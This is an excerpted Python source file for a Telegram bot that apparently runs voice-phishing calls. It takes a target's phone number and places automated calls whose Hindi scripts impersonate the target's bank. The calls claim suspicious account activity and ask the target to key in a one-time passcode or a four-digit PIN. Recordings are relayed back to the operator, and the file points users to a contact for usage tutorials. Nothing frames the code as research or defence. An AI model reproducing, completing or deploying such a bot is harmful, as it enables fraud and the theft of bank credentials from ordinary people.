...
def send_welcome(message):
    ...
    if check_admin(id) == True:
        ...
        item_back = types.KeyboardButton(text="🔙 Back")
        keyboard.add(item1)
        keyboard.add(item2)
...
def saving_phonenumber(message):
    ...
    try:
        z = phonenumbers.parse(no_tobesaved, None)
        if phonenumbers.is_valid_number(z) == True:
            save_phonenumber(no_tobesaved, userid)
            call_or_sms_or_script(message)
        else:
            bot.send_message(message.chat.id,
                             " Invalid Number ❌\nPlease use international format with country code.\nUse /start command.")
    except phonenumbers.NumberParseException:
        bot.send_message(message.chat.id, "Invalid Number ❌\nPlease use international format with + and country code (e.g., +919876543210).\nUse /start command")
...
def how_to_help(message):
    bot.send_message(message.chat.id, "• Contact @TechieGamer 👑\n\n• Use /faq for more help")


@bot.message_handler(commands=['faq'])
def how_faq(message):
    bot.send_message(message.chat.id, "• Please Contact @TechieGamer FOr Usage Tutorial")
...
def voice_wf(userid):
    ...
    if choice == 'human' or choice == 'unknown':
        ...
        gather.say(f"यह {bankname} से एक स्वचालित कॉल है। हमने आपके अकाउंट में एक संदिग्ध लॉगिन का प्रयास पाया है। अगर यह आप थे, तो कॉल काट दें। इस प्रयास को रोकने के लिए, कृपया अपने फोन नंबर पर भेजे गए वन टाइम पासकोड को दर्ज करें, उसके बाद स्टार key दबाएं।", language='hi-IN', voice='Polly.Aditi')
        resp.append(gather)
...
def intro_pin(userid):
    ...
    if choice == 'human' or choice == 'unknown':
        ...
        gather.say(f"नमस्ते, यह {bankname} से एक स्वचालित कॉल है। हमने आपके अकाउंट में संदिग्ध गतिविधि पाई है। अगर यह आप नहीं थे तो कॉल पर बने रहें। इस प्रयास को रोकने के लिए कृपया अपना चार अंकों का पिन दर्ज करें, उसके बाद स्टार key दबाएं।", language='hi-IN', voice='Polly.Aditi')
        resp.append(gather)
...
def handle_recordings(userid):
    ...
    if 'RecordingUrl' in request.values:
        ...
        try:
            ...
            bot.send_message(chat_id, f"Call recording available at: {mp3_audiofile}")
    else:
